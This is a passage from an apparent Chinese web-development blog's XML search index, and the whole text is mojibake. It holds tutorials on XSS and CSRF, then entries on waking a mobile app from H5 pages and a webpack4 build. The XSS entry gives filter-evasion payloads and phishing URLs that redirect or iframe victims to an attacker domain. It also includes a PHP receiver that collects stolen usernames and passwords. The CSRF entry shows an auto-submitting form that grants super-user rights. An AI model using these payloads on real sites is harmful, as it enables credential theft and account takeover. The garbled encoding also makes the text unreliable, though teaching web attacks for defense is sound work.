ç›—å–cookie:å¯ä»¥ä½¿ç”¨ç°æˆçš„xsså¹³å°. å¦‚æœcookieä¸­çš„æŸäº›å…³é”®å€¼åŠ äº†HttpOnly,é‚£ä¹ˆå°±å¯ä»¥é¿å…è¯¥ç½‘é¡µçš„cookieè¢«å®¢æˆ·ç«¯çš„JSå­˜å–ï¼Œä¹Ÿå°±ä¿æŠ¤äº†ç”¨æˆ·çš„cookieä¸è¢«ç›—å–. å½“å‰å¯è§çš„ç»•è¿‡Httponlyçš„æ–¹æ³•å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šä¸€ç±»æ˜¯æœåŠ¡å™¨é…ç½®æˆ–åŠŸèƒ½å®ç°ä¸Šå­˜åœ¨å¯èƒ½è¢«åˆ©ç”¨çš„å¼±ç‚¹ï¼Œå¯å½’ç»“ä¸ºæœåŠ¡ç«¯çš„ä¿¡æ¯æ³„éœ²ã€‚å¦‚åˆ©ç”¨404 é¡µã€PHPINFOé¡µï¼ŒTraceæ–¹æ³•ç­‰ç»•è¿‡HTTPonlyï¼›å¦ä¸€ç±»æ˜¯å®¢æˆ·ç«¯æ¼æ´æˆ–åŠŸèƒ½ä¸Šå­˜åœ¨å¯ä»¥è¢«åˆ©ç”¨çš„å¼±ç‚¹ï¼Œå¯å½’ç»“ä¸ºå®¢æˆ·ç«¯çš„ä¿¡æ¯æ³„éœ²ã€‚å¦‚ MS08-069ã€åˆ©ç”¨ajaxæˆ–flashè¯»å–set-cookieç­‰ã€‚ ç»•è¿‡é˜²å¾¡ è¿‡æ»¤äº†alert(1)çš„æ‹¬å·,å¯ä»¥ç”¨alert1 //åå¼•å· åˆ©ç”¨jså­—ç¬¦ä¸²æ¨¡å— eval.call${&#39;\141\154\145\162\164\50\61\51&#39;} è½¬æ¢å¤§å°å†™alert(1) ç»•è¿‡Phpçš„htmlspecialchars() Phpçš„htmlspecialchars()é»˜è®¤èƒ½å°†&lt; &gt; &amp; â€œè½¬æˆ&lt; &gt; &amp; â€œ å¦‚æœç”¨äº†htmlspecialchars($name, ENT_QUOTES); åˆ™ â€™ ä¹Ÿä¼šè¢«è½¬æˆ â€˜ å¦‚æœç”¨äº† htmlspecialchars ($name, ENT_NOQUOTES);åˆ™å•åŒå¼•å·éƒ½ä¸ä¼šè¢«è½¬æ¢ã€‚ J**sä¸­å¯ç”¨ä»¥ä¸‹ä»£ç ç»•è¿‡**ï¼š Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)) H**tmlä¸­å¯ç”¨ä»¥ä¸‹ä»£ç ç»•è¿‡**: â€˜ onmouseover=â€™alert(1) æºä»£ç æ˜¯ å˜æˆäº† 2.phpæºä»£ç  &lt;?php $name = $_GET[â€œnameâ€]; $name = htmlspecialchars($name); ?&gt; åœ°å€æ è¾“å…¥http://127.0.0.1/2.php?name=â€™ onmouseover=â€™alert(1)åå›è½¦ ç„¶åå°†é¼ æ ‡ç§»åˆ°é‚£ä¸ªæ¡†æ¡†åï¼Œ å¼¹å‡ºå¼¹çª—. Xssé’“é±¼(æŒ‚é©¬): (1)xssé‡å®šå‘é’“é±¼ å¦‚è‡ªå·±å»ºä¸€ä¸ªé’“é±¼ç½‘ç«™www.xiumu.com, ç„¶åå—å®³è€…è®¿é—®å¦‚ä¸‹åœ°å€http://www.test.com/a.php?id=â€â€&gt;document.location.href=â€http://www.xiumu.comâ€ æˆ–è€…http://www.test.com/a.php?id=â€â€&gt;&lt;iframe src=â€http://www.xiumu.comâ€ height=0 width=0 &gt; (2)HTMLæ³¨å…¥å¼é’“é±¼ ç›´æ¥åˆ©ç”¨XSSæ¼æ´æ³¨å°„HTML/js ä»£ç åˆ°é¡µé¢ä¸­.å¯å†™ä¸€ä¸ªæ­£å¸¸çš„HTMLè¡¨å•æ¥çªƒå–è´¦å·å¯†ç .å¦‚:http://www.test.com/a.php?id=â€â€loginusernamepassword è¿™æ ·å½“ç”¨æˆ·ç›´æ¥å¡«å…¥è´¦å·å¯†ç æäº¤åï¼Œä½ å°±å¯ä»¥åœ¨xiumu.phpæ¥æ”¶åˆ°å—å®³è€…çš„è´¦å·å¯†ç äº†. Xiumu.phpä»£ç :&lt;?php echo $_POST[â€˜aâ€™]?&gt;&lt;?php echo $_POST[â€˜bâ€™]?&gt; (3)Xssè·¨æ¡†æ¶é’“é±¼ è¿™ç§æ–¹å¼æ˜¯é€šè¿‡åµŒå…¥è¿œç¨‹åŸŸçš„ä¸€ä¸ªé¡µé¢å®æ–½é’“é±¼,http://www.test.com/a.php?id=â€â€&gt;&lt;iframe src=â€http://www.xiumu.comâ€ height=â€100%â€ width=â€100%â€&gt;å°†www.xiumu.comçš„é¡µé¢åšçš„å’Œtestçš„é¡µé¢ç›¸åŒ(å¯åˆ©ç”¨iframeå®ç°)ï¼Œä½†å—å®³è€…çœ‹åˆ°çš„ä¸æ˜¯çœŸæ­£çš„testé¡µé¢ï¼Œè€Œæ˜¯xiumué¡µé¢. ï¼ˆ4ï¼‰xss.tv æ˜¯ä¸ªå¥½ç½‘ç«™ å¸¸ç”¨ç¼–ç åˆ˜å¿—é¾™å¤§ç¥åˆ†æçš„å¾ˆå¥½ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ï¼Œåˆ˜å¿—é¾™-ä»é›¶å¼€å§‹å­¦webå®‰å…¨ï¼ˆ3ï¼‰ XSS é˜²å¾¡XSSé˜²å¾¡åŸºæœ¬ä¸Šéµå¾ªä¸ƒæ¡åŸåˆ™: ä¸è¦åœ¨é¡µé¢ä¸­æ’å…¥ä»»ä½•ä¸å¯ä¿¡æ•°æ®ï¼Œé™¤éè¿™äº›æ•°å·²ç»æ®æ ¹æ®ä¸‹é¢å‡ ä¸ªåŸåˆ™è¿›è¡Œäº†ç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLæ ‡ç­¾ä¹‹é—´æ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTML Entityç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTMLå±æ€§ç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°SCRIPTé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒSCRIPTç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°Styleå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒCSSç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTML URLé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒURLç¼–ç  ä½¿ç”¨å¯Œæ–‡æœ¬æ—¶ï¼Œä½¿ç”¨XSSè§„åˆ™å¼•æ“è¿›è¡Œç¼–ç è¿‡æ»¤ å‚è€ƒé“¾æ¥]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF æ”»å‡»å’Œé˜²å¾¡]]></title>
    <url>%2FCSRF%20%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[CSRF ä»‹ç»CSRFï¼ˆCross Site Request Forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯æ”»å‡»è€…ç›—ç”¨ï¼ˆåˆ©ç”¨ï¼‰ä½ çš„èº«ä»½å‡­è¯ï¼Œè¿›è¡Œæœªç»ç”¨æˆ·è®¸å¯çš„æ¶æ„æ“ä½œã€‚ä¸ XSS ä¸åŒçš„æ˜¯ï¼ŒCSRF ç›´æ¥åˆ©ç”¨ç”¨æˆ·å½“å‰çš„èº«ä»½å‡­è¯ï¼Œè€Œ XSS ä¸»è¦æ˜¯çªƒå–ç”¨æˆ·çš„èº«ä»½å‡­è¯ã€‚ CSRF å±å®³CSRF ç›—ç”¨å—å®³è€…èº«ä»½ï¼Œå®Œæˆå—å®³è€…æœªç»è¿‡æˆæƒçš„æ“ä½œï¼Œèƒ½åšçš„éå¸¸å¤šï¼š é“¶è¡Œéæ³•è½¬è´¦ éæ³•æ·»åŠ ç®¡ç† åˆ©ç”¨ç”¨æˆ·å‘é€ç”µå­é‚®ç”µ ä¿®æ”¹ç”¨æˆ·å¯†ç  â€¦.. CSRF åŸç†æˆ‘ä»¬ç»“åˆä¸€ä¸ªç®€å•çš„ demo å’Œä¸‹å›¾åˆ†æä¸€ä¸‹ æµè§ˆå¹¶ç™»å½•æ”¶ä¿¡ä»»çš„ç½‘ç«™ Aï¼Œè¿™é‡Œæˆ‘ä»¬å‡è®¾æ˜¯ï¼ˆ//127.0.0.1:3000/login)ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªé“¶è¡Œç½‘ç«™ï¼Œå¦‚ä¸‹å›¾ï¼š é€šè¿‡éªŒè¯ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šç§æ¤ä¸‹ Cookieï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒsessionID è®°å½•äº†ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°å¯ä»¥è½¬è´¦æˆåŠŸäº† ç”¨æˆ·åœ¨æ²¡æœ‰ç™»å‡º A ç½‘ç«™çš„æƒ…å†µä¸‹ï¼Œè®¿é—®ç½‘ç«™ Bï¼Œè¿™é‡Œæˆ‘ä»¬å‡è®¾æ˜¯ï¼ˆ//127.0.0.1:8888ï¼‰ï¼Œå¯ä»¥çœ‹åˆ° hacker å·²ç»åœ¨â€œç‚¹å‡»è¿™é‡Œæœ‰æƒŠå–œâ€ç§ä¸‹æ”»å‡»ä»£ç äº† â€‹ â€‹ B è¦æ±‚è®¿é—®ç¬¬ä¸‰æ–¹ç½‘ç«™ Aï¼ˆ//127.0.0.1:3000)ï¼Œå½“ç”¨æˆ·ç»ä¸ä½è¯±æƒ‘æˆ–è€…ä¸å°å¿ƒç‚¹äº†å¸¦æ”»å‡»çš„é“¾æ¥ï¼Œå°±ä¼šå¯¹ç¬¬ä¸‰æ–¹ç½‘ç«™ A å‘èµ·è½¬è´¦çš„è¯·æ±‚ã€‚ æ ¹æ®ç¬¬ 4 æ­¥çš„è¯·æ±‚ï¼Œæµè§ˆå™¨å¸¦ç€ç¬¬ 1 æ­¥ç§æ¤çš„ cookieï¼Œå‘ A ç½‘ç«™å‘èµ·è½¬è´¦è¯·æ±‚ï¼ŒA ç½‘ç«™æ£€éªŒåˆ°æ˜¯åˆæ³•ç”¨æˆ·ï¼ˆå› ä¸ºå¸¦çš„ cookie æ˜¯åˆæ³•çš„ï¼‰ï¼Œäºæ˜¯åŒæ„è½¬è´¦ï¼Œæ”»å‡»å®Œæˆã€‚ å…¶ä»–æ¡ˆä¾‹ CSRF ç†è§£é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å®ç°ä¸€ä¸ª CSRF æ”»å‡»ï¼Œéœ€è¦ç”±å››éƒ¨åˆ†ç»„æˆï¼š æœ‰ä¸€ä¸ªæ— éœ€åå°éªŒè¯çš„å‰ç«¯æˆ–åå°æ•°æ®ä¿®æ”¹æˆ–æ–°å¢çš„æ¼æ´å­˜åœ¨ï¼Œæˆ–è€…æœ‰å¯ä»¥æ¬ºéª—åå°éªŒè¯çš„å‰ç«¯æˆ–åå°æ•°æ®ä¿®æ”¹æˆ–æ–°å¢çš„æ¼æ´å­˜åœ¨ï¼› å¦‚æœéœ€è¦è®¤è¯ï¼Œè¿˜éœ€è¦ç”¨æˆ·å½“å‰ç¼“å­˜çš„è®¤è¯ä¿¡æ¯æœ‰æ•ˆã€‚ ä¼ªé€ æ•°æ®æ“ä½œè¯·æ±‚çš„æ¶æ„é“¾æ¥æˆ–è€…é¡µé¢ï¼› è¯±æƒ‘ç”¨æˆ·ä¸»åŠ¨è®¿é—®æˆ–ç™»å½•æ¶æ„é“¾æ¥ï¼Œå‡ºå‘éæ³•æ“ä½œï¼› ä¸»è¦å­˜åœ¨äºç”¨æˆ·å¯†ç ä¿®æ”¹ã€è´­ç‰©åœ°å€çš„ä¿®æ”¹æˆ–åå°ç®¡ç†è´¦æˆ·çš„æ–°å¢ç­‰ç­‰æ“ä½œè¿‡ç¨‹ã€‚ CSRF åˆ©ç”¨æ–¹å¼åˆ©ç”¨ CSRF æ”»å‡»ï¼Œä¸»è¦åŒ…å«ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäº GET è¯·æ±‚çš„åˆ©ç”¨ï¼Œå°±å¦‚ä¸Šé¢ä¾‹å­ä»‹ç»çš„é‚£æ ·ï¼Œç›´æ¥æ„é€ æ”»å‡» urlï¼Œå¦ä¸€ç§æ˜¯åŸºäº POST è¯·æ±‚æ–¹å¼çš„åˆ©ç”¨ã€‚ POST ä¹Ÿæ²¡ä»€ä¹ˆï¼Œä¸€ä¸ª form è¡¨å•æå®šï¼š 12345678&lt;script&gt;$(function() &#123; $(&apos;#CSRF_forCSRFm&apos;).trigger(&apos;submit&apos;);&#125;);&lt;/script&gt;&lt;form action=&quot;http://a.com/user/grant_super_user&quot; id=&quot;CSRF_form&quot; method=&quot;post&quot;&gt; &lt;input name=&quot;uid&quot; value=&quot;121&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt; æ³¨æ„ï¼šform è¡¨å•æ˜¯ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜çš„ï¼Œæäº¤ form è¡¨å•ä¼šå¸¦ä¸Š cookieã€‚ä¸è¦è€æ€ª CORSï¼Œå› ä¸º form è¡¨å•è·¨åŸŸæäº¤ï¼Œä¼šè·³è½¬é¡µé¢ï¼ŒåŸé¡µé¢è„šæœ¬æ— æ³•è·å–æ–°é¡µé¢çš„å†…å®¹ï¼Œå› æ­¤æµè§ˆå™¨è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œå¯ä»¥ç†è§£ä¸º a æ ‡ç­¾çš„è·³è½¬ï¼›CORS ä¸»è¦æ˜¯ç”¨æ¥é˜²æ­¢ç¬¬ä¸‰æ–¹è„šæœ¬|ä»£ç åœ¨å½“å‰é¡µé¢è¿è¡Œã€‚é€šè¿‡å…¶ä»–æ–¹å¼å‘èµ·è¯·æ±‚ï¼ŒCORS å°±å¾ˆæœ‰ä½œç”¨äº†ã€‚ CSRFé˜²èŒƒæ—¢ç„¶ CSRF æ”»å‡»çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨ç™»å½•ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼Œè€Œæ‰‹æ®µå¤§å¤šæ˜¯ä»ç¬¬ä¸‰æ–¹ç½‘ç«™å‘èµ·ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹æ¡ˆè¿›è¡Œé˜²èŒƒï¼š referer éªŒè¯ éªŒè¯æœºåˆ¶ token referer éªŒè¯HTTP åè®®é‡Œé¢å®šä¹‰äº†ä¸€ä¸ª referer å­—æ®µï¼Œè®°å½•äº†è®¿é—®æ¥æºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ¤æ–­ refererï¼Œéæ”¶ä¿¡ä»»çš„ referer æ‹’ç»è®¿é—®ã€‚ä½†æ˜¯å®¹æ˜“ç»•è¿‡ï¼ŒçœŸæ­£åˆ°äº†éœ€è¦éªŒè¯çš„æ—¶å€™ï¼Œä½œç”¨ä¸å¤§ã€‚ éªŒè¯æœºåˆ¶å½“ç”¨æˆ·è¿›è¡Œæ•æ„Ÿä¿¡æ¯ä¿®æ”¹ï¼Œè´¢äº§ç­‰ä¸¥é‡é—®é¢˜æ—¶ï¼Œå¯ä»¥åŠ ä¸€å±‚éªŒè¯æœºåˆ¶ï¼š è¾“å…¥å½“å‰ç”¨æˆ·å¯†ç ï¼Œé˜²æ­¢æœªæˆæƒç”¨æˆ· éªŒè¯ç éªŒè¯ ç¬¬äºŒä¸ªå¯†ç ï¼Œæ¯”å¦‚æ”¯ä»˜å¯†ç ç­‰ è™½ç„¶ä¼šç‰ºç‰²ä¸€éƒ¨åˆ†ç”¨æˆ·ä½“éªŒï¼Œä½†æ˜¯ä¸ºäº†ç”¨æˆ·ä¿¡æ¯è´¢äº§å®‰å…¨ï¼Œæœ‰äº›åœ°æ–¹ä½¿ç”¨è¿˜æ˜¯æœ‰å¿…è¦çš„ã€‚ tokenæ·»åŠ åŸºäºå½“å‰ç”¨æˆ·èº«ä»½çš„æœ‰æ•ˆ tokens éšæœºéªŒè¯æœºåˆ¶ï¼Œå³åœ¨å‘åç«¯æäº¤æ•°æ®æ“ä½œè¯·æ±‚æ—¶ï¼Œæ·»åŠ åŸºäºå½“å‰ç”¨æˆ·çš„éšæœº token æ ¡éªŒå€¼ï¼Œæ­¤ç§æ–¹æ³•å½“å‰ä½¿ç”¨çš„æ¯”è¾ƒå¤šã€‚]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5 å”¤èµ· APP]]></title>
    <url>%2FH5%20%E5%94%A4%E8%B5%B7%20APP%2F</url>
    <content type="text"><![CDATA[å›¾ç‰‡æ¥æº ä¸ºäº†å‘æˆ‘ä»¬çš„APPå¯¼æµï¼Œä¸€äº›åˆ†äº«å‡ºå»çš„é¡µé¢å’Œå¤§éƒ¨åˆ†çš„æ´»åŠ¨é¡µæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿç›´æ¥ç”±å…¶ä»–å¹³å°ï¼ˆå¾®ä¿¡ã€QQã€å¾®åšã€æµè§ˆå™¨ï¼‰ç­‰ç›´æ¥å”¤èµ·æˆ‘ä»¬çš„APPã€‚ä½†æ˜¯å…¶ä»–å¹³å°æ›´å¤šçš„æ˜¯å¸Œæœ›ç”¨æˆ·åœç•™åœ¨è‡ªå·±å¹³å°å†…ï¼Œè¿›è€Œé˜»æ­¢ç”¨æˆ·å”¤èµ·ç¬¬ä¸‰æ–¹APPçš„æ“ä½œã€‚ ä¸¤ç§æ„æ„¿çš„å†²çªå¼•å‘äº†å¹³å°APPå’Œç¬¬ä¸‰æ–¹APPåœ¨å”¤èµ·åŠŸèƒ½ä¸­çš„åšå¼ˆã€‚å¯¹äºæˆ‘ä»¬ç¬¬ä¸‰æ–¹APPï¼Œå¦‚ä½•æ‰èƒ½åœ¨è¿™åœºåšå¼ˆä¸­è·å¾—æœ€ä¼˜è§£å‘¢ï¼Ÿ æ²¡æœ‰é“¶å¼¹ï¼Œåªæœ‰é’ˆå¯¹å„ç§å¹³å°çš„å¯¼å¼¹ç”±äºå„ä¸ªå¹³å°å¯¹å”¤èµ·è¡Œä¸ºçš„å°é”æ–¹å¼ä¸åŒï¼Œä»¥åŠæˆ‘ä»¬ä¸šåŠ¡é«˜é¢‘éœ€æ±‚åœºæ™¯ä¸åŒï¼Œéœ€è¦é’ˆå¯¹ä¸åŒå¹³å°åšç‰¹æ®Šå¤„ç†ã€‚ é’ˆå¯¹ä¸¤ä¸ªç³»ç»Ÿå’Œ4ä¸ªé«˜é¢‘å¹³å°åšåˆ†æã€‚ï¼ˆä¸ºäº†ç®€åŒ–æµç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬åªé’ˆå¯¹ä¸‰ä¸ªå¹³å°åšåˆ†æï¼Œå…¶ä»–å¹³å°åˆ†ææ€ç»´ç±»ä¼¼ï¼‰ IOSios &gt;= 9.0 æ”¯æŒæ–°çš„ Universal Links å”¤èµ·åè®®ï¼Œè¿™é‡Œæˆ‘ä»¬ç®€ç§° link åè®®ï¼Œä¸æ¸…æ¥šçš„è¯·è‡ªè¡Œ googleã€‚å¤§éƒ¨åˆ†å¹³å°ä¹Ÿæ”¯æŒã€‚ å¾®ä¿¡ç¦äº† link åè®®ï¼Œä½¿ç”¨ link é“¾æ¥ä¾ç„¶æ— æ³•å”¤èµ· APPï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°† link é“¾æ¥å¯¹åº”åˆ°ä¸€ä¸ªä¸‹è½½é¡µï¼Œå¼•å¯¼ç”¨æˆ· Safari æ‰“å¼€ï¼Œå½“ç”¨æˆ·ç‚¹å‡» Safari æ‰“å¼€çš„æ—¶å€™ç›´æ¥è§¦å‘ link åè®®ï¼Œè¿›è€Œç›´æ¥å”¤èµ· APPã€‚âš ï¸ è¿™é‡Œæ˜¯ç›´æ¥å”¤èµ· APPï¼Œä¸éœ€è¦ç»è¿‡ Safari ä¸­è½¬ã€‚ å¾®åšã€QQã€Safari éƒ½æ˜¯æ²¡æœ‰ç¦ç”¨ link åè®®çš„ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ é’ˆå¯¹é»˜å†™ç¦ç”¨ link åè®®æµè§ˆå™¨å¯ä»¥å°è¯•ä½¿ç”¨ schema å”¤èµ·åè®®ã€‚ æœ‰äº›å¹³å°ä¸æ”¯æŒç›´æ¥è·³ App Storeï¼Œéœ€è¦é€šè¿‡ itunes å¹³å° https://itunes.apple.com/cn/app + url Anroidandroid å”¤èµ·ä½¿ç”¨ schema åè®®ã€‚ android å¾®ä¿¡æ²¡æœ‰ link åè®®å¯ä»¥ä½¿ç”¨ï¼Œå¯ä»¥å®ç°ä¸€ä¸ªä¸‹è½½é¡µï¼Œåœ¨ä¸‹è½½é¡µé¢å¼•å¯¼ç”¨æˆ·æµè§ˆå™¨æ‰“å¼€ï¼Œç”¨æˆ·é€šè¿‡æµè§ˆå™¨æ‰“å¼€çš„æ—¶å€™ç›´æ¥è§¦å‘å”¤èµ·è„šæœ¬ã€‚ç›¸æ¯”äº ios å¾®ä¿¡ï¼Œå”¤èµ·è¿‡ç¨‹ä¸­é—´å¤šäº†ä¸€å±‚æµè§ˆå™¨ä¸­è½¬ï¼ˆå…·ä½“çœ‹æµè§ˆå™¨å®ç°ï¼Œæœ‰äº›æµè§ˆå™¨æœ‰å¼¹çª—è®©ç”¨æˆ·ç¡®è®¤æ˜¯å¦å”¤èµ· APP ï¼‰ å¯¹äºç¦ç”¨ schema åè®®çš„å¹³å°æ¥è¯´éƒ½å¯ä»¥é‡‡ç”¨é’ˆå¯¹å¾®ä¿¡çš„æ–¹æ¡ˆã€‚ æ²¡æœ‰ç¦ç”¨ schema åè®®çš„ç›´æ¥ä½¿ç”¨ schema åè®®å°±å¥½ã€‚ å…¶ä»–æœ‰äº›åº”ç”¨åœ¨å¾®ä¿¡èƒ½å¤Ÿç›´æ¥å”¤èµ· APPï¼Œæ˜¯å› ä¸ºè¿™äº›å…¬å¸ä¸å¾®ä¿¡æœ‰æ·±åº¦åˆç§Ÿå…³ç³»ï¼Œåœ¨å¾®ä¿¡ç™½åå•å†…ã€‚ æœ‰äº›åº”ç”¨åœ¨å¾®ä¿¡èƒ½é€šè¿‡åº”ç”¨å®å”¤èµ· APPï¼Œæ˜¯å› ä¸ºåœ¨åº”ç”¨å®ä¸Šï¼Œä»–ä»¬çš„åº”ç”¨æ»¡è¶³ä¸‹é¢å››ä¸ªæ¡ä»¶ä¹‹ä¸€ï¼ˆå¯ä»¥ç”³è¯· APP link) åº”ç”¨è¯„çº§è¾¾åˆ°Açº§ï¼› åº”ç”¨å¾®ä¸‹è½½æ—¥è®¿é—®é‡è¾¾åˆ°10W/å¤©ï¼› é¡¹ç›®/åº”ç”¨å‚åŠ è…¾è®¯â€œåŒç™¾â€æ‰¶æŒè®¡åˆ’ï¼› åº”ç”¨ç”±è…¾è®¯æŠ•èµ„å è‚¡ã€‚ å¦‚ä½•æ‚¨çš„åº”ç”¨ç¬¦åˆä¸Šé¢å››ä¸ªæ¡ä»¶ä¹‹ä¸€ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å½¢å¼æ‹¼æ¥ url: http://a.app.qq.com/o/simple.jsp?pkgname=com.xx.abc&amp;android_schema=appname://a/b?url=https://www.a.com/b/c.html ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ä¸‹è½½é¡µé¢ï¼Ÿå¯èƒ½ä¼šæœ‰åŒå­¦é—®ï¼Œä¸Šæ–‡å”¤èµ·æµç¨‹å›¾ï¼Œå”¤ä¸èµ·çš„ä¹‹åçš„ä¸‹è½½æµç¨‹ä¸ºä»€ä¹ˆèµ°ä¸‹è½½é¡µï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸‹è½½ã€‚è€ƒè™‘åˆ°ä¸¤ä¸ªå› ç´ ï¼š å¹³å°å·®å¼‚åŒ–ä¸¥é‡ï¼Œç¬”è€…æš‚æ²¡æ‰¾åˆ°åˆé€‚çš„åŠæ³•ï¼Œåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å”¤èµ· APP æˆåŠŸï¼Œå¦‚æœç”¨æˆ·å”¤èµ·æˆåŠŸè¿˜è®©ç”¨æˆ·ä¸‹è½½æ˜¯éå¸¸ä¸å¥½çš„ä½“éªŒã€‚ï¼ˆå¦‚æœä½ ä»¬æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œæ¬¢è¿ä¸‹æ–¹ç•™è¨€ï¼‰ å°†å”¤èµ·ä¸‹è½½é€»è¾‘ç»Ÿä¸€å°è£…ä¸€ä¸ªä¸‹è½½|å”¤èµ·æ¨¡å—æ˜“äºä»£ç çš„ç»´æŠ¤å’Œç®¡ç†ã€‚]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>å”¤èµ·</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack4 H5æ´»åŠ¨é¡µæ„å»º]]></title>
    <url>%2Fwebpack4%E6%B4%BB%E5%8A%A8%E6%9E%84%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[ç”±äºå…¬å¸çš„H5æ´»åŠ¨é¡µæ„å»ºè€æ—§ï¼Œå­˜åœ¨ä¸€ç³»åˆ—é—®é¢˜ï¼Œäºæ˜¯èŒç”Ÿäº†ç”¨ webpack4 é‡å†™æ•´ä¸ªæ„å»ºçš„æƒ³æ³•ï¼Œåœ¨æ­¤è®°å½•ä¸‹é‡åˆ°çš„é—®é¢˜ä¸å¯¹åº”çš„è§£å†³æ–¹æ¡ˆã€‚ âš ï¸ æœ¬æ–‡ä¸æ¶‰åŠ webpack4 é…ç½®çš„åŸºç¡€çŸ¥è¯†ï¼ ç›®æ ‡ æ”¯æŒå•é¡µå’Œå¤šé¡µ æ”¯æŒå¼€å‘æ—¶çš„çƒ­æ›´æ–° æ„å»ºè¿‡ç¨‹å¯é…ç½® æ”¯æŒæ¥å£ mock æ”¯æŒ es6 è¯­æ³• å¼¹æ€§è®¾é…ç§»åŠ¨ç«¯å±å¹• ç›®å½•ç»“æ„ |-- lib æ´»åŠ¨ä¸“ç”¨ js è„šæœ¬ |-- thirdsrc ç¬¬ä¸‰æ–¹ä»£ç åº“ |-- build æ„å»ºè„šæœ¬ |-- mock mock æ•°æ® |-- template æ¨¡ç‰ˆ |-- css |-- js |-- entry å…¥å£æ–‡ä»¶ï¼Œå¤„ç†ä¸€äº›å…¬ç”¨é€»è¾‘ |-- img |-- view.html ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“zeptoå¼•å…¥ zepto æ˜¯ä¸ºäº†æé«˜ dom çš„æ“ä½œæ•ˆç‡ï¼Œå¹¶ä¸”ç¬¦åˆå›¢é˜Ÿäººå‘˜çš„å¼€å‘ä¹ æƒ¯ã€‚ä¸ºäº†ä¸è®©åŸºç¡€ä¾èµ–åº“è¿‡å¤§ï¼Œåªå¼•å…¥äº† zepto ä¸­çš„ zeptoã€eventã€ajax ä¸‰ä¸ªæ¨¡å—ã€‚ æ²¡æœ‰è€ƒè™‘ä½¿ç”¨ vueã€react ç­‰æ¡†æ¶çš„åŸå› ï¼šè™½ç„¶å¼•å…¥ç¬¬ä¸‰æ–¹æ¡†æ¶ï¼Œèƒ½å¤Ÿæ›´å¥½çš„å¤ç”¨ä»£ç ï¼Œé™ä½å¼€å‘äººå‘˜å¼€å‘åˆ‡æ¢å¼€å‘ä»£ä»·ï¼Œä½†æ˜¯ä¼šå¼•å…¥ä¸€ä¸ªæ›´å¤§çš„é—®é¢˜ï¼Œä¾èµ–åŸºç¡€åŒ…å¤ªå¤§äº†ï¼Œåœ¨ç”¨æˆ·ç½‘ç»œä¸å¥½çš„æƒ…å†µä¸‹ï¼ŒåŠå…¶å½±å“ç”¨æˆ·ä½“éªŒã€‚ä¸ºäº†ä¸€ä¸ªæ´»åŠ¨é¡µï¼Œå¼•å…¥è¿™ä¹ˆé‡çš„æ¡†æ¶ä¸å€¼å¾—ã€‚å¦‚æœ vue3.0 å®ç°å®ƒçš„ç›®æ ‡ï¼Œå‹ç¼©ååªæœ‰ 10kï¼Œé‚£ä¹ˆæ˜¯ä¸€ä¸ªéå¸¸å¥½çš„é€‰æ‹©ã€‚ fastclickç”±äºæˆ‘ä»¬çš„ä»£ç è¿˜è¦è¿è¡Œåœ¨ ios è€çš„ webview ä¸Šï¼Œä¾ç„¶ä¼šæœ‰ click å»¶è¿Ÿ 300ms é—®é¢˜ï¼Œå› æ­¤å¼•å…¥è¿™ä¸ªåŸºç¡€åº“ã€‚ å¼•å…¥æ–¹å¼12import '/path/to/fastclick';import '/path/to/zepto'; 